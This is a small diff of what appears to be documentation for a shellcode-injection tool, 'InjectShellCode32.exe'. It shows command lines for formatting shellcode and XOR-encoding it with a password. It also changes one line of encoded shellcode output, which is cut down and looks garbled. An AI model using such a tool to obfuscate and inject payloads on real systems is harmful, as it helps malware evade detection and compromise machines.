@@ -92,7 +92,7 @@ InjectShellCode32.exe FormatFile --path d://shellcode.txt --output d://output_sh
 ```C
 InjectShellCode32.exe Xor --path d://output_shellcode.txt --passwd lyshark
 
-% &{{%ssssssuspr'q{z&vuw{!vqps{!vqs {!vqrws%!tw"qu{!tqq{pr%%pr s" p urt sqq qs r %s'sr twztv&%vqvt{!vqrs{!wqp sr's{!wst{%s!v"qvuu"ssvp%%'v
+% &{{%ssssssuspr'q{z&vuw{!vqps{!vqs {!vqrws%!tw"qu{!tqq{pr%%pr s" p urtwst{%s!v"qvuu"ssvp%%'v
 ```
 
 
